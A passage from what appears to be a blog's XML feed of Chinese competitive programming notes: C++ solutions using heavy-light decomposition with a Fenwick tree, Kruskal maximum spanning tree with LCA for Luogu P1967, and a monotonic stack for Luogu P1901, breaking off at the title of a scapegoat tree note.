class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lowbit(x) x&amp;-x</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; P;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000000</span>;</span><br><span class="line">P war[maxn];</span><br><span class="line"><span class="type">int</span> fa[maxn], dep[maxn], val[maxn], sz[maxn], top[maxn], son[maxn];</span><br><span class="line"><span class="type">int</span> tre[maxn];</span><br><span class="line"><span class="type">int</span> tot;</span><br><span class="line"><span class="type">int</span> cntw;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ch, x = <span class="number">0</span>, f = <span class="number">1</span>;ch = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>((ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &amp;&amp; ch != <span class="string">&#x27;-&#x27;</span>) ch = <span class="built_in">getchar</span>();</span><br><span class="line">    ch == <span class="string">&#x27;-&#x27;</span> ? f = <span class="number">-1</span>, ch = <span class="built_in">getchar</span>() : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x = x * <span class="number">10</span> + ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f * x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> to, len, nxt;</span><br><span class="line">    <span class="built_in">Edge</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">Edge</span>(<span class="type">int</span> _to, <span class="type">int</span> _len, <span class="type">int</span> _nxt):<span class="built_in">to</span>(_to), <span class="built_in">len</span>(_len), <span class="built_in">nxt</span>(_nxt) &#123;&#125;</span><br><span class="line">&#125;E[maxn];</span><br><span class="line"><span class="type">int</span> h[maxn], cnte;</span><br><span class="line"><span class="type">int</span> L[maxn], R[maxn];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> add)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = x;i &lt;= maxn; i += <span class="built_in">lowbit</span>(i)) tre[i] += add;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>; <span class="keyword">for</span>(<span class="type">int</span> i = x; i; i -= <span class="built_in">lowbit</span>(i)) ans += tre[i]; <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    E[++cnte] = <span class="built_in">Edge</span>(v, w, h[u]), h[u] = cnte;</span><br><span class="line">    E[++cnte] = <span class="built_in">Edge</span>(u, w, h[v]), h[v] = cnte;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    sz[x] = <span class="number">1</span>; dep[x] = dep[fa[x]] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[x]; i; i = E[i].nxt) &#123;</span><br><span class="line">        <span class="type">int</span> to = E[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to == fa[x]) <span class="keyword">continue</span>;</span><br><span class="line">        fa[to] = x;val[x] = E[i].len;</span><br><span class="line">        <span class="built_in">dfs1</span>(to);</span><br><span class="line">        sz[x] += sz[to];</span><br><span class="line">        <span class="keyword">if</span>(sz[to] &gt; sz[son[x]]) son[x] = to;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    L[x] = ++tot;</span><br><span class="line">    <span class="keyword">if</span>(x == son[fa[x]]) top[x] = top[fa[x]];</span><br><span class="line">    <span class="keyword">else</span> top[x] = x;</span><br><span class="line">    <span class="keyword">if</span>(son[x]) <span class="built_in">dfs2</span>(son[x]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = h[x]; i; i = E[i].nxt) &#123;</span><br><span class="line">        <span class="type">int</span> to = E[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to == fa[x] || to == son[x]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(to);</span><br><span class="line">    &#125;</span><br><span class="line">    R[x] = tot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cut</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L[x] &lt; L[y]) <span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="built_in">update</span>(L[x], <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L[x] &lt; L[y]) <span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="built_in">update</span>(L[x], <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qsum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;<span class="comment">//其实可以查到有1就退出，不用查完和</span></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(top[x] != top[y])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]] &lt; dep[top[y]])<span class="built_in">swap</span>(x, y);</span><br><span class="line">        ans += (<span class="built_in">query</span>(L[x]) - <span class="built_in">query</span>(L[top[x]] - <span class="number">1</span>));</span><br><span class="line">        x = fa[top[x]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dep[x] &lt; dep[y])<span class="built_in">swap</span>(x, y);</span><br><span class="line">    <span class="keyword">if</span> (x!=y)</span><br><span class="line">ans += (<span class="built_in">query</span>(L[x]) - <span class="built_in">query</span>(L[y]));</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) <span class="built_in">add_edge</span>(<span class="built_in">read</span>(), <span class="built_in">read</span>(), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">dfs1</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dfs2</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">50</span>];</span><br><span class="line">        cin &gt;&gt; s;</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>();</span><br><span class="line">            <span class="built_in">cut</span>(u, v);</span><br><span class="line">            war[++cntw] = <span class="built_in">P</span>(u, v);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[<span class="number">0</span>] == <span class="string">&#x27;U&#x27;</span>) &#123;</span><br><span class="line">            <span class="type">int</span> w = <span class="built_in">read</span>();</span><br><span class="line">            <span class="built_in">connect</span>(war[w].first, war[w].second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">qsum</span>(<span class="built_in">read</span>(), <span class="built_in">read</span>()) != <span class="number">0</span>) <span class="built_in">puts</span>(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;Yes&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数链剖分 </tag>
            
            <tag> 树状数组 </tag>
            
            <tag> LCA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P1967 货车运输</title>
      <link href="/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/"/>
      <url>/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href>https://www.luogu.org/problemnew/show/P1902</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一个n个点m条边的无向带权图，每次询问2点u,v的联通情况，不联通则输出-1。<br>如果联通，不妨将一条联通u,v的路径上的最小权值记为w，则该次询问输出所有可能的w中的最大值。<br>共有q次询问。</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>对于任意两点u&amp;v，我们需要找出能使得w最大的一条最优路径。<br>因此需要生成一个新图，使得原图中联通<strong>任意两点之间只存在一条</strong>能使得w最大的最优路径。<br>因此这是一棵树……<br>又因为要使w最大，应尽量选择边权大的边作为路径……  然后就突然发觉：这不就是Kruskal算法的过程吗？只不过最小生成树优先选择边权小的边，此时优先选择边权大的。<br>因此要求的新图就是一颗<strong>最大生成树</strong>……Kruskal可破。<br>然后就是求任意两点LCA了。此处使用倍增，也方便维护某节点向树根爬的时候路上的最小权值。<br>（用树链剖分+线段树维护也行…………）<br>更具体的看代码注释。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inf 1000000005</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> u,v,w;<span class="comment">//两点u&amp;v以及边权</span></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Node &amp;b) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> w&lt;b.w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector &lt;Node&gt; e[<span class="number">50005</span>];<span class="comment">//e[u]储存节点u相连的边集。</span></span><br><span class="line">priority_queue &lt;Node&gt; Q;<span class="comment">//边权越大的优先级越高</span></span><br><span class="line"><span class="type">int</span> fa[<span class="number">50005</span>];<span class="comment">//Kruskal的御用并查集，fa[u]代表u点所处集合</span></span><br><span class="line"><span class="type">bool</span> vis[<span class="number">50005</span>];<span class="comment">//是否已经被dfs过程访问过</span></span><br><span class="line"><span class="type">int</span> fas[<span class="number">50005</span>][<span class="number">21</span>],minw[<span class="number">50005</span>][<span class="number">21</span>],deep[<span class="number">50005</span>];</span><br><span class="line"><span class="comment">//fas[u][j]代表u点在所处树中的第2^j级父亲编号</span></span><br><span class="line"><span class="comment">//minw[u][j]代表u点在所处树中至第2^j级父亲的路径上最小边权</span></span><br><span class="line"><span class="comment">//deep[u]代表u点在所处树中深度</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//查找x所在集合编号</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x==fa[x]) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> fa[x]=<span class="built_in">find</span>(fa[x]);<span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">uni</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> <span class="comment">//合并a,b所在集合</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fa[<span class="built_in">find</span>(a)]=<span class="built_in">find</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> v,<span class="type">int</span> w)</span> <span class="comment">//添加新图边</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node one;</span><br><span class="line">    one.u=u;</span><br><span class="line">    one.v=v;</span><br><span class="line">    one.w=w;</span><br><span class="line">    e[u].<span class="built_in">push_back</span>(one);</span><br><span class="line">    <span class="built_in">uni</span>(u,v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> f,<span class="type">int</span> k)</span><span class="comment">//dfs，u代表当前点，f为当前点父亲，k为深度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vis[u]=<span class="number">1</span>;</span><br><span class="line">    deep[u]=k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;e[u].<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e[u][i].v==f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(e[u][i].v,u,k+<span class="number">1</span>);</span><br><span class="line">            fas[e[u][i].v][<span class="number">0</span>]=u;</span><br><span class="line">            minw[e[u][i].v][<span class="number">0</span>]=e[u][i].w;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> n,m,q;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> linked=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!Q.<span class="built_in">empty</span>()&amp;&amp;linked&lt;n<span class="number">-1</span>) &#123;<span class="comment">//边数m可能少于n-1，因此需要注意Q是否为空</span></span><br><span class="line">        Node now=Q.<span class="built_in">top</span>();</span><br><span class="line">        Q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> a=now.u,b=now.v;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">find</span>(a)==<span class="built_in">find</span>(b)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            linked++;</span><br><span class="line">            <span class="built_in">add</span>(a,b,now.w);</span><br><span class="line">            <span class="built_in">add</span>(b,a,now.w);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lca</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span><span class="comment">//求x，y的lca</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">find</span>(x)!=<span class="built_in">find</span>(y)) <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//不在一个树里</span></span><br><span class="line">    <span class="type">int</span> ans=inf;</span><br><span class="line">    <span class="keyword">if</span> (deep[y] &gt;deep[x]) <span class="built_in">swap</span>(x,y);<span class="comment">//较深的标记为x</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//令x跳到与y相同高度</span></span><br><span class="line">        <span class="keyword">if</span>(deep[fas[x][i]]&gt;=deep[y])&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,minw[x][i]);</span><br><span class="line">            x=fas[x][i];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (x==y) <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>; i&gt;=<span class="number">0</span>; i--)<span class="comment">//让x,y一起跳到lca节点下方</span></span><br><span class="line">        <span class="keyword">if</span>(fas[x][i]!=fas[y][i])&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,<span class="built_in">min</span>(minw[x][i],minw[y][i]));</span><br><span class="line">            x=fas[x][i]; </span><br><span class="line">            y=fas[y][i];</span><br><span class="line">        &#125;</span><br><span class="line">    ans=<span class="built_in">min</span>(ans,<span class="built_in">min</span>(minw[x][<span class="number">0</span>],minw[y][<span class="number">0</span>]));<span class="comment">//统计最小边权</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        fa[i]=i;<span class="comment">//并查集预处理，各个点都处于自己所代表的集合</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</span><br><span class="line">        <span class="type">int</span> x,y,z;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;z);</span><br><span class="line">        Node one;</span><br><span class="line">        one.u=x;</span><br><span class="line">        one.v=y;</span><br><span class="line">        one.w=z;</span><br><span class="line">        Q.<span class="built_in">push</span>(one);<span class="comment">//加入Kruskal御用队列Q</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Kruskal</span>();<span class="comment">//最大生成树</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;<span class="comment">//倍增数组初始化&amp;dfs</span></span><br><span class="line">        <span class="keyword">if</span> (!vis[i]) &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(i,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">            fas[i][<span class="number">0</span>]=i;</span><br><span class="line">            minw[i][<span class="number">0</span>]=inf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">20</span>;i++) &#123;<span class="comment">//倍增预处理</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++) &#123;</span><br><span class="line">            fas[j][i]=fas[fas[j][i<span class="number">-1</span>]][i<span class="number">-1</span>];</span><br><span class="line">            minw[j][i]=<span class="built_in">min</span>(minw[j][i<span class="number">-1</span>],minw[fas[j][i<span class="number">-1</span>]][i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=q;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">lca</span>(a,b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
            <tag> Kruskal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P1901 发射站</title>
      <link href="/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/"/>
      <url>/2018/09/28/%E6%B4%9B%E8%B0%B7P1901%20%E5%8F%91%E5%B0%84%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href>https://www.luogu.org/problemnew/show/P1901</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>有 N 个能量发射站排成一行，每个都有**不相同的高度 $H_i$**，能向两边（当然两端的只能向一边）同时发射能量值为$V_i$ 的能量，并且发出的能量只被两边最近的且比它高的发射站接收。</p><p>显然，每个发射站发来的能量有可能被0或1或2个其他发射站所接受，求接收最多能量的发射站接收的能量是多少。</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>每个能量塔射出的能量被左右第一个比其高的塔所拦截。隐隐约约觉得可以用单调栈搞……<br>维护一个高度单调不升栈，考虑<strong>依次</strong>将能量塔i加入栈：  </p><ol><li>如果高度比栈顶元素大或栈空，栈顶元素能量加上$V_i$，压入栈;  </li><li>如果高度比栈顶元素小（栈顶元素编号记为top），当前能量塔i接收的能量加上$V_{top}$，弹出栈顶元素。重复执行直到符合情况1，按1的处理方法处理。<br>最后直接扫描一遍最大值，输出。</li></ol><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> s1[<span class="number">1000010</span>],h[<span class="number">1000010</span>],v[<span class="number">1000010</span>],sum[<span class="number">1000010</span>],ans,n,top;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;h[i],&amp;v[i]);</span><br><span class="line">        <span class="keyword">while</span>(top&amp;&amp;h[s1[top]]&lt;h[i])</span><br><span class="line">            sum[i]+=v[s1[top]],top--;</span><br><span class="line">        sum[s1[top]]+=v[i];</span><br><span class="line">        top++;</span><br><span class="line">        s1[top]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,sum[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>替罪羊树学习笔记</title>
      <link href="/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/08/03/%E6%9B%BF%E7%BD%AA%E7%BE%8A%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
